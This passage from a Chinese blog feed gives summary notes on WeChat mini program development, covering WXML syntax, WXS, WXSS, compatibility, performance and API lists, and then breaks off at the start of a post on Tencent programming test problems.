</code></pre><p>注意：注意：上述方式可以随意组合，但是如有存在变量名相同的情况，后边的会覆盖前面，如<code>&lt;template is=&quot;objectCombine&quot; data=&quot;{{...obj1, ...obj2, a, c: 6}}&quot;&gt;&lt;/template&gt;</code>，根据以下数据，最终组合成的对象是 <code>{a: 5, b: 3, c: 6}</code>。</p>
<pre><code>Page({
  data: {
    obj1: {
      a: 1,
      b: 2
    },
    obj2: {
      b: 3,
      c: 4
    },
    a: 5
  }
})
</code></pre><p>注意： 花括号和引号之间如果有空格，将最终被解析成为字符串,如下</p>
<pre><code>&lt;view wx:for=&quot;{{[1,2,3]}} &quot;&gt;
  {{item}}
&lt;/view&gt;
</code></pre><p>等同于</p>
<pre><code>&lt;view wx:for=&quot;{{[1,2,3] + ' '}}&quot;&gt;
  {{item}}
&lt;/view&gt;
</code></pre><h3 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h3><p>（1）<strong>wx:for</strong></p>
<p><strong>wx:for</strong> 在组件上使用 wx:for 控制属性绑定一个数组，即可使用数组中各项的数据重复渲染该组件。默认数组的当前项的下标变量名默认为 <code>index</code>，数组当前项的变量名默认为 <code>item</code>。</p>
<pre><code>&lt;view wx:for=&quot;{{array}}&quot;&gt;
  {{index}}: {{item.message}}
&lt;/view&gt;
</code></pre><p><strong>wx:for-item</strong> 指定数组当前元素的变量名。</p>
<p><strong>wx:for-index</strong> 指定数组当前下标的变量名。</p>
<pre><code>&lt;view wx:for=&quot;{{array}}&quot; wx:for-index=&quot;idx&quot; wx:for-item=&quot;itemName&quot;&gt;
  {{idx}} {{itemName.message}}
&lt;/view&gt;
</code></pre><p>wx:for 也可以嵌套，下边是一个九九乘法表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;view wx:for=&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&quot; wx:for-item=&quot;i&quot;&gt;</div><div class="line">  &lt;view wx:for=&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&#125;&quot; wx:for-item=&quot;j&quot;&gt;</div><div class="line">    &lt;view wx:if=&quot;&#123;&#123;i &lt;= j&#125;&#125;&quot;&gt;</div><div class="line">     &#123;&#123;i&#125;&#125; *&#123;&#123;j&#125;&#125; = &#123;&#123;i * j&#125;&#125;</div><div class="line">    &lt;/view&gt;</div><div class="line">  &lt;/view&gt;</div><div class="line">&lt;/view&gt;</div></pre></td></tr></table></figure>
<p>（2）<strong>block wx:for</strong></p>
<p>将 wx:for 用在<code>&lt;block/&gt;</code>标签上，以渲染一个包含多节点的结构块。</p>
<pre><code>&lt;block wx:for=&quot;{{[1, 2, 3]}}&quot;&gt;
  &lt;view&gt; {{index}}: &lt;/view&gt;
  &lt;view&gt; {{item}} &lt;/view&gt;
&lt;/block&gt;
</code></pre><p>（3）<strong>wx:key</strong></p>
<p>如果列表中项目的位置会动态改变或者有新的项目添加到列表中，并且希望列表中的项目保持自己的特征和状态（如 <code>&lt;input/&gt;</code> 中的输入内容，<code>&lt;switch/&gt;</code> 的选中状态），需要使用 wx:key 来<code>指定列表中项目的唯一的标识符</code>。</p>
<p>wx:key 的值以两种形式提供:</p>
<pre><code>1.字符串，代表在 for 循环的 array 中 item 的某个 property，该 property 的值需要是列表中唯一的字符串或数字，且不能动态改变。
2.保留关键字 *this 代表在 for 循环中的 item 本身，这种表示需要 item 本身是一个唯一的字符串或者数字，如：
</code></pre><p>当数据改变触发渲染层重新渲染的时候，会校正带有 key 的组件，框架会确保他们被重新排序，而不是重新创建，以确保使组件保持自身的状态，并且提高列表渲染时的效率。</p>
<p>注意： 当 wx:for 的值为字符串时，会将字符串解析成字符串数组。</p>
<pre><code>&lt;view wx:for=&quot;array&quot;&gt;
  {{item}}
&lt;/view&gt;
</code></pre><p>等同于</p>
<pre><code>&lt;view wx:for=&quot;{{['a','r','r','a','y']}}&quot;&gt;
  {{item}}
&lt;/view&gt;
</code></pre><h3 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h3><p>（1）<strong>wx:if</strong></p>
<p>用<code>wx:if=&quot;{{condition}}&quot;</code>来判断是否需要渲染该代码块, <code>&lt;view wx:if=&quot;{{condition}}&quot;&gt; True &lt;/view&gt;</code>。也可以用<code>wx:elif</code>和<code>wx:else</code>来添加一个else块：</p>
<pre><code>&lt;view wx:if=&quot;{{length > 5}}&quot;&gt; 1 &lt;/view&gt;
&lt;view wx:elif=&quot;{{length > 2}}&quot;&gt; 2 &lt;/view&gt;
&lt;view wx:else&gt; 3 &lt;/view&gt;
</code></pre><p>（2）<strong>block wx:if</strong></p>
<p><code>wx:if</code>是一个控制属性，需要将它添加到一个标签上。如果想一次性判断多个组件标签，可以使用一个<code>&lt;block/&gt;</code>标签将多个组件包装起来，并在上边使用<code>wx:if</code>控制属性。</p>
<pre><code>&lt;block wx:if=&quot;{{true}}&quot;&gt;
  &lt;view&gt; view1 &lt;/view&gt;
  &lt;view&gt; view2 &lt;/view&gt;
&lt;/block&gt;
</code></pre><p>注意：<code>&lt;block/&gt;</code>并不是一个组件，它仅仅是一个包装元素，不会在页面中做任何渲染，只接受控制属性。</p>
<p><code>wx:if</code> <strong>vs</strong> <code>hidden</code></p>
<p>因为<code>wx:if</code>之中的模板也可能包含数据绑定，所以当<code>wx:if</code>的条件值切换时，框架有一个局部渲染的过程，因为它会确保条件块在切换时销毁或重新渲染。同时<code>wx:if</code>也是惰性的，如果在初始渲染条件为<code>false</code>，框架什么也不做，在条件第一次变成真的时候才开始局部渲染。</p>
<p>相比之下，<code>hidden</code>就简单的多，组件始终会被渲染，只是简单的控制显示与隐藏。</p>
<p>一般来说，<code>wx:if</code>有更高的切换消耗而<code>hidden</code>有更高的初始渲染消耗。因此，如果需要频繁切换的情景下，用<code>hidden</code>更好，如果在运行时条件不大可能改变则<code>wx:if</code>较好。</p>
<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>WXML提供模板（template），可以在模板中定义代码片段，然后在不同的地方调用。 模板拥有自己的作用域，只能使用data传入的数据。</p>
<p>（1）定义模板：使用name属性，作为模板的名字，然后在<code>&lt;template/&gt;</code>内定义代码片段。如下：</p>
<pre><code>&lt;template name=&quot;msgItem&quot;&gt;
  &lt;view&gt;
    &lt;text&gt; {{index}}: {{msg}} &lt;/text&gt;
    &lt;text&gt; Time: {{time}} &lt;/text&gt;
  &lt;/view&gt;
&lt;/template&gt;
</code></pre><p>（2）使用模板： 使用 <code>is</code>属性，声明需要使用的模板，然后将模板所需要的data传入。 <code>&lt;template is=&quot;msgItem&quot; data=&quot;{{...item}}&quot;/&gt;</code></p>
<pre><code>Page({
  data: {
    item: {
      index: 0,
      msg: &apos;this is a template&apos;,
      time: &apos;2016-09-15&apos;
    }
  }
})
</code></pre><p><code>is</code> 属性可以使用Mustache语法，来动态决定具体需要渲染哪个模板。</p>
<pre><code>&lt;template name=&quot;odd&quot;&gt;
  &lt;view&gt; odd &lt;/view&gt;
&lt;/template&gt;
&lt;template name=&quot;even&quot;&gt;
  &lt;view&gt; even &lt;/view&gt;
&lt;/template&gt;

&lt;block wx:for=&quot;{{[1, 2, 3, 4, 5]}}&quot;&gt;
    &lt;template is=&quot;{item % 2 == 0 ? &apos;even&apos; : &apos;odd&apos;}}&quot;/&gt;
&lt;/block&gt;
</code></pre><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>什么是事件：<br>    事件是视图层到逻辑层的通讯方式。<br>    事件可以将用户的行为反馈到逻辑层进行处理。<br>    事件可以绑定在组件上，当达到触发事件，就会执行逻辑层中对应的事件处理函数。<br>    事件对象可以携带额外信息，如id, dataset, touches。 </p>
<p>（1）事件的使用方式 </p>
<ul>
<li><p>在组件中绑定一个事件处理函数，如 <code>bindtap</code>，当用户点击该组件的时候会在该页面对应的Page中找到相应的事件处理函数。<br><code>&lt;view id=&quot;tapTest&quot; data-hi=&quot;WeChat&quot; bindtap=&quot;tapName&quot;&gt; Click me! &lt;/view&gt;</code></p>
</li>
<li><p>在相应的Page定义中写上相应的事件处理函数，参数是event。</p>
<p>  Page({</p>
<pre><code>tapName: function(event) {
  console.log(event)
}
</code></pre><p>  })</p>
</li>
</ul>
<p>事件分为<strong>冒泡事件</strong>(当一个组件上的事件被触发后，该事件会向父节点传递)和<strong>非冒泡事件</strong>(当一个组件上的事件被触发后，该事件不会向父节点传递),WXML的冒泡事件列表如下：<br><img src="http://ou3oh86t1.bkt.clouddn.com/smallProgram/images/WXML%E5%86%92%E6%B3%A1%E4%BA%8B%E4%BB%B6%E5%88%97%E8%A1%A8.png" alt="WXML冒泡事件列表"></p>
<p>tips：除上表之外的其他组件自定义事件都是非冒泡事件，如<code>&lt;form/&gt;</code>的submit事件，<code>&lt;input/&gt;</code>的input事件，<code>&lt;scroll-view/&gt;</code>的scroll事件。</p>
<p>（2）事件的绑定</p>
<p>事件绑定的写法同组件的属性，以key、value的形式。 key以<code>bind</code>或<code>catch</code>开头，然后跟上事件的类型，如<code>bindtap</code>, <code>catchtouchstart</code>。 value是一个字符串，需要在对应的Page中定义同名的函数。不然当触发事件的时候会报错。 </p>
<p><code>bind</code>事件绑定不会阻止冒泡事件向上冒泡，<code>catch</code>事件绑定可以阻止冒泡事件向上冒泡。例如，如在下边这个例子中，点击inner view会先后触发<code>handleTap3</code>和<code>handleTap2</code>(因为tap事件会冒泡到middle view，而middle view阻止了tap事件冒泡，不再向父节点传递)，点击middle view会触发<code>handleTap2</code>，点击outter view会触发<code>handleTap1</code>。</p>
<pre><code>&lt;view id=&quot;outter&quot; bindtap=&quot;handleTap1&quot;&gt;
  outer view
  &lt;view id=&quot;middle&quot; catchtap=&quot;handleTap2&quot;&gt;
    middle view
    &lt;view id=&quot;inner&quot; bindtap=&quot;handleTap3&quot;&gt;
      inner view
    &lt;/view&gt;
  &lt;/view&gt;
&lt;/view&gt;
</code></pre><p>（3）事件对象</p>
<p>当组件触发事件时，逻辑层绑定该事件的处理函数会收到一个事件对象。事件对象属性如下：<br><img src="http://ou3oh86t1.bkt.clouddn.com/smallProgram/images/%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E5%88%97%E8%A1%A8.png" alt="事件对象属性"></p>
<p>在组件中可以定义数据，这些数据将会通过事件传递给 SERVICE。书写方式：以<code>data-</code>开头，多个单词由连字符<code>-</code>链接，不能有大写(大写会自动转成小写)如<code>data-element-type</code>，最终在 <code>event.target.dataset</code> 中会将连字符转成驼峰elementType。</p>
<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>WXML提供两种文件引用方式<code>import</code>和<code>include</code>。</p>
<p>（1）import</p>
<p>import可以在该文件中使用目标文件定义的template。 import有作用域的概念，即只会import目标文件中定义的template，而不会import目标文件import的template。</p>
<p>（2）include</p>
<p>include可以将目标文件除了<code>&lt;template/&gt;</code>的整个代码引入，相当于是拷贝到include位置。（感觉有点ejs中模板include的感觉）</p>
<h2 id="WXS"><a href="#WXS" class="headerlink" title="WXS"></a>WXS</h2><p>WXS（WeiXin Script）是小程序的一套脚本语言，结合 WXML，可以构建出页面的结构。</p>
<p>注意:</p>
<pre><code>wxs 不依赖于运行时的基础库版本，可以在所有版本的小程序中运行。
wxs 与 javascript 是不同的语言，有自己的语法，并不和 javascript 一致。
wxs 的运行环境和其他 javascript 代码是隔离的，wxs 中不能调用其他 javascript 文件中定义的函数，也不能调用小程序提供的API。
wxs 函数不能作为组件的事件回调。
由于运行环境的差异，在 iOS 设备上小程序内的 wxs 会比 javascript 代码快 2 ~ 20 倍。在 android 设备上二者运行效率无差异。
</code></pre><p>wxs用于页面渲染的使用示例，页面输出 hello world：</p>
<pre><code>&lt;!--wxml--&gt;
&lt;wxs module=&quot;m1&quot;&gt;
var msg = &quot;hello world&quot;;

module.exports.message = msg;
&lt;/wxs&gt;

&lt;view&gt; {{m1.message}} &lt;/view&gt;
</code></pre><p>wxs还可用于数据处理。</p>
<h3 id="WXS模块"><a href="#WXS模块" class="headerlink" title="WXS模块"></a>WXS模块</h3><p>WXS 代码可以编写在 wxml 文件中的 <code>&lt;wxs&gt;</code> 标签内，或以 .wxs 为后缀名的文件内。</p>
<pre><code>每一个 .wxs 文件和 &lt;wxs&gt; 标签都是一个单独的模块。
每个模块都有自己独立的作用域。即在一个模块里面定义的变量与函数，默认为私有的，对其他模块不可见。
一个模块要想对外暴露其内部的私有变量与函数，只能通过 module.exports 实现。
</code></pre><p>每个 wxs 模块均有一个内置的 module 对象,通过exports属性，可以对外共享本模块的私有变量与函数。</p>
<p>在.wxs模块中引用其他 wxs 文件模块，可以使用 require 函数。引用的时候，要注意如下几点：</p>
<pre><code>只能引用 .wxs 文件模块，且必须使用相对路径。
wxs 模块均为单例，wxs 模块在第一次被引用时，会自动初始化为单例对象。多个页面，多个地方，多次引用，使用的都是同一个 wxs 模块对象。
如果一个 wxs 模块在定义之后，一直没有被引用，则该模块不会被解析与运行。
</code></pre><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><pre><code>WXS 中的变量均为值的引用。
没有声明的变量直接赋值使用，会被定义为全局变量。
如果只声明变量而不赋值，则默认值为 undefined。
var表现与javascript一致，会有变量提升。
</code></pre><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>单行注释 <code>//</code> 多行注释<code>/* */</code></p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>WXS 语言目前共有以下几种数据类型：</p>
<pre><code>number ： 数值
string ：字符串
boolean：布尔值
object：对象
function：函数
array : 数组
date：日期
regexp：正则
</code></pre><p>(1)number 整数、小数</p>
<p>方法：</p>
<pre><code>toString
toLocaleString
valueOf
toFixed
toExponential
toPrecision
</code></pre><p>(2)string </p>
<p>方法:</p>
<pre><code>toString
valueOf
charAt
charCodeAt
concat
indexOf
lastIndexOf
localeCompare
match
replace
search
slice
split
substring
toLowerCase
toLocaleLowerCase
toUpperCase
toLocaleUpperCase
trim
</code></pre><p>(3)boolean</p>
<p>方法:</p>
<pre><code>toString
valueOf
</code></pre><p>(4)object</p>
<p>方法:</p>
<pre><code>toString：返回字符串 &quot;[object Object]&quot;
</code></pre><p>(5)function</p>
<p>方法:</p>
<pre><code>toString：返回字符串 &quot;[function Function]&quot;。
</code></pre><p>(6)array</p>
<p>方法:</p>
<pre><code>toString
concat
join
pop
push
reverse
shift
slice
sort
splice
unshift
indexOf
lastIndexOf
every
some
forEach
map
filter
reduce
reduceRight
</code></pre><p>(7)date </p>
<p>生成 date 对象需要使用 getDate()函数, 返回一个当前时间的对象。date类型还有很多<a href="https://www.w3cschool.cn/weixinapp/weixinapp-54te2czr.html" target="_blank" rel="noopener">方法</a>。</p>
<p>(8)regexp </p>
<p>生成 regexp 对象需要使用 getRegExp()函数。 方法有<code>exec</code>、<code>test</code>、<code>toString</code>。</p>
<p>tips: 数据类型的判断可以使用 constructor 属性。使用 typeof 也可以区分部分数据类型。</p>
<h2 id="WXSS"><a href="#WXSS" class="headerlink" title="WXSS"></a>WXSS</h2><p>WXSS(WeiXin Style Sheets)是一套样式语言，用于描述WXML的组件样式。WXSS具有CSS大部分特性。同时为了更适合开发微信小程序，对CSS进行了扩充以及修改。扩展的特性有尺寸单位、样式导入。</p>
<p>尺寸单位：px（responsive pixel），可以根据屏幕宽度进行自适应。规定屏幕宽为750rpx。如在iPhone6上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像。</p>
<p>样式导入：使用@import语句可以导入外联样式表，@import跟需要导入的外联样式表的相对路径（相对路径放在引号中），用<code>;</code>表示语句结束。</p>
<p>内联样式：框架组件上支持使用style、class属性来控制组件的样式。</p>
<ul>
<li>style：静态的样式统一写到class中。style接收动态的样式，在运行时会进行解析，尽量避免将静态的样式写进style中，以免影响渲染速度。<br><code>&lt;view style=&quot;color:{{color}};&quot; /&gt;</code></li>
</ul>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/smallProgram/images/WXSS%E7%9B%AE%E5%89%8D%E6%94%AF%E6%8C%81%E7%9A%84%E9%80%89%E6%8B%A9%E5%99%A8.png" alt="WXSS目前支持的选择器"></p>
<h1 id="兼容"><a href="#兼容" class="headerlink" title="兼容"></a>兼容</h1><p>小程序的功能不断的增加，但是旧版本的微信客户端并不支持新功能，所以在使用这些新能力的时候需要做兼容。文档会在组件，API等页面描述中带上各个功能所支持的版本号。</p>
<p>可以通过<code>wx.getSystemInfo</code>或者<code>wx.getSystemInfoSync</code>获取到小程序的基础库版本号。也可以通过 <code>wx.canIUse</code> 来判断是否可以在该基础库版本下直接使用对应的API或者组件。</p>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>对于新增的 API，可以用以下代码来判断是否支持用户的手机。</p>
<pre><code>if (wx.openBluetoothAdapter) {
  wx.openBluetoothAdapter()
} else {
  // 如果希望用户在最新版本的客户端上体验您的小程序，可以这样子提示
  wx.showModal({
    title: &apos;提示&apos;,
    content: &apos;当前微信版本过低，无法使用该功能，请升级到最新微信版本后重试。&apos;
  })
}
</code></pre><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>对于 API 的参数或者返回值有新增的参数，可以用以下代码判断。</p>
<pre><code>wx.showModal({
  success: function(res) {
    if (wx.canIUse(&apos;showModal.cancel&apos;)) {
      console.log(res.cancel)
    }
  }
})
</code></pre><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>对于组件，新增的属性在旧版本上不会被处理，不过也不会报错。如果特殊场景需要对旧版本做一些降级处理，可以这样子做。</p>
<pre><code>Page({
  data: {
    canIUse: wx.canIUse(&apos;button.open-type.contact&apos;)
  }
})
&lt;!-- wxml --&gt;
&lt;button wx:if=&quot;{{canIUse}}&quot; open-type=&quot;contact&quot;&gt; 客服消息 &lt;/button&gt;
&lt;contact-button wx:else&gt;&lt;/contact-button&gt;
</code></pre><h1 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h1><pre><code>小程序没有重启的概念
当小程序进入后台，客户端会维持一段时间的运行状态，超过一定时间后（目前是5分钟）会被微信主动销毁
置顶的小程序不会被微信主动销毁
当收到系统内存告警也会进行小程序的销毁
</code></pre><p>再次打开逻辑： 基础库 1.4.0 开始支持，低版本需做兼容处理。</p>
<pre><code>用户打开小程序的预期有以下两类场景：
A. 打开首页： 场景值有 1001, 1019, 1022, 1023, 1038, 1056
B. 打开小程序指定的某个页面： 场景值为除 A 以外的其他
</code></pre><p><img src="http://ou3oh86t1.bkt.clouddn.com/smallProgram/images/%E5%86%8D%E6%AC%A1%E6%89%93%E5%BC%80%E9%80%BB%E8%BE%91.png" alt="再次打开逻辑"></p>
<h1 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h1><p>setData是小程序开发中使用最频繁的接口，也是最容易引发性能问题的接口。</p>
<p><code>setData</code>工作原理：</p>
<p>小程序的视图层目前使用 WebView 作为渲染载体，而逻辑层是由独立的 JavascriptCore 作为运行环境。在架构上，WebView 和 JavascriptCore 都是独立的模块，并不具备数据直接共享的通道。当前，视图层和逻辑层的数据传输，实际上通过两边提供的evaluateJavascript所实现。即用户传输的数据(由视图层去往逻辑层)，需要将其转换为字符串形式传递，同时把转换后的数据内容拼接成一份 JS 脚本，再通过执行 JS 脚本的形式传递到两边独立环境。</p>
<p>而evaluateJavascript的执行会受很多方面的影响，数据到达视图层并不是实时的。同一进程内的 WebView 实际上会共享一个 JS VM，如果 WebView 内 JS 线程正在执行渲染或其他逻辑，会影响 evaluateJavascript 脚本的实际执行时间，另外多个 WebView 也会抢占 JS VM 的执行权限；另外还有 JS 本身的编译执行耗时，都是影响数据传输速度的因素。</p>
<h2 id="常见的-setData-操作错误"><a href="#常见的-setData-操作错误" class="headerlink" title="常见的 setData 操作错误"></a>常见的 setData 操作错误</h2><p>(1)频繁的去 setData。 Android 下用户在滑动时会感觉到卡顿，操作反馈延迟严重；渲染有出现延时。</p>
<p>(2) 每次 setData 都传递大量新数据。</p>
<p>(3)后台态页面进行 setData。</p>
<h2 id="图片资源"><a href="#图片资源" class="headerlink" title="图片资源"></a>图片资源</h2><p>图片资源的主要性能问题在于大图片和长列表图片上，这两种情况都有可能导致 iOS 客户端内存占用上升，从而触发系统回收小程序页面。除了内存问题外，大图片也会造成页面切换的卡顿。</p>
<h2 id="代码包大小的优化"><a href="#代码包大小的优化" class="headerlink" title="代码包大小的优化"></a>代码包大小的优化</h2><p>小程序一开始时代码包限制为 1MB，后增加到 2MB 。代码包上限的增加对于开发者来说，能够实现更丰富的功能，但对于用户来说，也增加了下载流量和本地空间的占用。</p>
<p><strong>控制代码包内图片资源：</strong> 小程序代码包经过编译后，会放在微信的 CDN 上供用户下载，CDN 开启了 GZIP 压缩，所以用户下载的是压缩后的 GZIP 包，其大小比代码包原体积会更小。 GZIP 对基于文本资源的压缩效果最好，在压缩较大文件时往往可高达 70%-80% 的压缩率，而如果对已经压缩的资源（例如大多数的图片格式）则效果甚微。</p>
<p><strong>及时清理没有使用到的代码和资源：</strong> 在日常开发的时候，我们可能引入了一些新的库文件，而过了一段时间后，由于各种原因又不再使用这个库了，我们常常会只是去掉了代码里的引用，而忘记删掉这类库文件了。目前小程序打包是会将工程下所有文件都打入代码包内，也就是说，这些没有被实际使用到的库文件和资源也会被打入到代码包里，从而影响到整体代码包的大小。</p>
<h1 id="组件-1"><a href="#组件-1" class="headerlink" title="组件"></a>组件</h1><p>框架为开发者提供了一系列<a href="https://www.w3cschool.cn/weixinapp/itz51q8o.html" target="_blank" rel="noopener">基础组件</a>，开发者可以通过组合这些基础组件进行快速开发。</p>
<pre><code>组件是视图层的基本组成单元。
组件自带一些功能与微信风格的样式。
一个组件通常包括开始标签和结束标签，属性用来修饰这个组件，内容在两个标签之内。
</code></pre><p>注意：所有组件与属性都是小写，以连字符-连接。</p>
<p>基础组件分为以下八大类：</p>
<p><strong>视图容器</strong>： <code>view</code>(视图容器)、 <code>scroll-view</code>（可滚动视图容器）、 <code>swiper</code>(可滑动视图容器)</p>
<p><strong>基础内容</strong>： <code>icon</code>(图标)、  <code>text</code>(文字)、  <code>progress</code>(进度条)</p>
<p><strong>表单</strong>：</p>
<pre><code>button     按钮
form     表单
input     输入框
checkbox     多项选择器
radio     单项选择器
picker     列表选择器
picker-view     内嵌列表选择器
slider     滑动选择器
switch     开关选择器
label   标签
</code></pre><p><strong>导航</strong>： <code>navigator</code>(应用内跳转)</p>
<p><strong>多媒体</strong>： </p>
<pre><code>audio     音频
image     图片
video     视频
</code></pre><p><strong>地图</strong>： <code>map</code>(地图)</p>
<p><strong>画布</strong>： <code>canvas</code>(画布)</p>
<p><strong>客服会话</strong>： <code>contact-button</code>(进入客服会话按钮)</p>
<h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><p>框架提供丰富的微信原生API，可以方便的调起微信提供的能力，如获取用户信息，本地存储，支付功能等。</p>
<pre><code>wx.on开头的API是监听某个事件发生的API接口，接受一个CALLBACK函数作为参数。当该事件触发时，会调用CALLBACK函数。
如未特殊约定，其他API接口都接受一个OBJECT作为参数。
OBJECT中可以指定success,fail,complete来接收接口调用结果。
</code></pre><h3 id="网络API"><a href="#网络API" class="headerlink" title="网络API"></a>网络API</h3><pre><code>wx.request      发起网络请求
wx.uploadFile      上传文件
wx.downloadFile      下载文件
wx.connectSocket    创建WebSocket连接
wx.onSocketOpen      监听WebSocket打开
wx.onSocketError    监听WebSocket错误
wx.sendSocketMessage    发送WebSocket消息
wx.onSocketMessage      接受WebSocket消息
wx.closeSocket      关闭WebSocket连接
wx.onSocketClose    监听WebSocket关闭
</code></pre><h3 id="媒体API"><a href="#媒体API" class="headerlink" title="媒体API"></a>媒体API</h3><pre><code>wx.chooseImage    从相册选择图片，或者拍照
wx.previewImage    预览图片
wx.startRecord    开始录音
wx.stopRecord    结束录音
wx.playVoice    播放语音
wx.pauseVoice    暂停播放语音
wx.stopVoice    结束播放语音
wx.getBackgroundAudioPlayerState    获取音乐播放状态
wx.playBackgroundAudio    播放音乐
wx.pauseBackgroundAudio    暂停播放音乐
wx.seekBackgroundAudio    控制音乐播放进度
wx.stopBackgroundAudio    停止播放音乐
wx.onBackgroundAudioPlay    监听音乐开始播放
wx.onBackgroundAudioPause    监听音乐暂停
wx.onBackgroundAudioStop    监听音乐结束
wx.chooseVideo    从相册选择视频，或者拍摄
</code></pre><h3 id="文件API"><a href="#文件API" class="headerlink" title="文件API"></a>文件API</h3><pre><code>wx.saveFile    保存文件
wx.getSavedFileList    获取已保存的文件列表
wx.getSavedFileInfo    获取已保存的文件信息
wx.removeSavedFile    删除已保存的文件信息
wx.openDocument    打开文件
</code></pre><h3 id="数据API"><a href="#数据API" class="headerlink" title="数据API"></a>数据API</h3><pre><code>wx.getStorage    获取本地数据缓存
wx.getStorageSync    获取本地数据缓存
wx.setStorage    设置本地数据缓存
wx.setStorageSync    设置本地数据缓存
wx.getStorageInfo    获取本地缓存的相关信息
wx.getStorageInfoSync    获取本地缓存的相关信息
wx.removeStorage    删除本地缓存内容
wx.removeStorageSync    删除本地缓存内容
wx.clearStorage    清理本地数据缓存
wx.clearStorageSync    清理本地数据缓存
</code></pre><h3 id="位置API"><a href="#位置API" class="headerlink" title="位置API"></a>位置API</h3><pre><code>wx.getLocation    获取当前位置
wx.chooseLocation    打开地图选择位置
wx.openLocation    打开内置地图
wx.createMapContext    地图组件控制
</code></pre><h3 id="设备API"><a href="#设备API" class="headerlink" title="设备API"></a>设备API</h3><pre><code>wx.getNetworkType    获取网络类型
wx.onNetworkStatusChange    监听网络状态变化
wx.getSystemInfo    获取系统信息
wx.getSystemInfoSync    获取系统信息
wx.onAccelerometerChange    监听加速度数据
wx.startAccelerometer    开始监听加速度数据
wx.stopAccelerometer    停止监听加速度数据
wx.onCompassChange    监听罗盘数据
wx.startCompass    开始监听罗盘数据
wx.stopCompass    停止监听罗盘数据
wx.setClipboardData    设置剪贴板内容
wx.getClipboardData    获取剪贴板内容
wx.makePhoneCall    拨打电话
wx.scanCode    扫码
</code></pre><h3 id="界面API"><a href="#界面API" class="headerlink" title="界面API"></a>界面API</h3><pre><code>wx.showToast    显示提示框
wx.showLoading    显示加载提示框
wx.hideToast    隐藏提示框
wx.hideLoading    隐藏加载提示框
wx.showModal    显示模态弹窗
wx.showActionSheet    显示菜单列表
wx.setNavigationBarTitle    设置当前页面标题
wx.showNavigationBarLoading    显示导航条加载动画
wx.hideNavigationBarLoading    隐藏导航条加载动画
wx.navigateTo    新窗口打开页面
wx.redirectTo    原窗口打开页面
wx.switchTab    切换到 tabbar 页面
wx.navigateBack    退回上一个页面
wx.createAnimation    动画
wx.createCanvasContext    创建绘图上下文
wx.drawCanvas    绘图
wx.stopPullDownRefresh    停止下拉刷新动画
</code></pre><h3 id="WXML节点信息API"><a href="#WXML节点信息API" class="headerlink" title="WXML节点信息API"></a>WXML节点信息API</h3><pre><code>wx.createSelectorQuery    创建查询请求
selectorQuery.select    根据选择器选择单个节点
selectorQuery.selectAll    根据选择器选择全部节点
selectorQuery.selectViewport    选择显示区域
nodesRef.boundingClientRect    获取布局位置和尺寸
nodesRef.scrollOffset    获取滚动位置
nodesRef.fields    获取任意字段
selectorQuery.exec    执行查询请求
</code></pre><h3 id="开放接口"><a href="#开放接口" class="headerlink" title="开放接口"></a>开放接口</h3><pre><code>wx.login    登录
wx.getUserInfo    获取用户信息
wx.chooseAddress    获取用户收货地址
wx.requestPayment    发起微信支付
wx.addCard    添加卡券
wx.openCard    打开卡券
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;小程序开发文档的简要概括。&lt;br&gt;
    
    </summary>
    
      <category term="WeChat MiniPro" scheme="http://yoursite.com/categories/WeChat-MiniPro/"/>
    
    
      <category term="WeChat MiniPro" scheme="http://yoursite.com/tags/WeChat-MiniPro/"/>
    
  </entry>
  
  <entry>
    <title>2018春招研发岗在线模拟笔试编程题总结</title>
    <link href="http://yoursite.com/2018/03/24/2018-Tencent-spring-programming-simulation/"/>
    <id>http://yoursite.com/2018/03/24/2018-Tencent-spring-programming-simulation/</id>
    <published>2018-03-24T06:52:04.000Z</published>
    <updated>2018-05-29T02:37:04.415Z</updated>
    
    <content type="html"><![CDATA[<p>2018春季腾讯研发岗在线模拟笔试算法题目总结。<br><a id="more"></a></p>
<h3 id="给出四个点的坐标判断是否为正方形"><a href="#给出四个点的坐标判断是否为正方形" class="headerlink" title="给出四个点的坐标判断是否为正方形"></a>给出四个点的坐标判断是否为正方形</h3><p>思路：暴力方法，求出任意两点之间的距离，如果有四条相等，剩下两条距离相等，则构成正方形。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">      <span class="comment">//给出四个点的坐标，判断这四个点能否构成一个正方形，其中四个点的横坐标存在x数组中，与横坐标对应的纵坐标存在y数组中</span></div><div class="line">      <span class="function"><span class="keyword">function</span> <span class="title">judgeSquare</span>(<span class="params">x, y</span>) 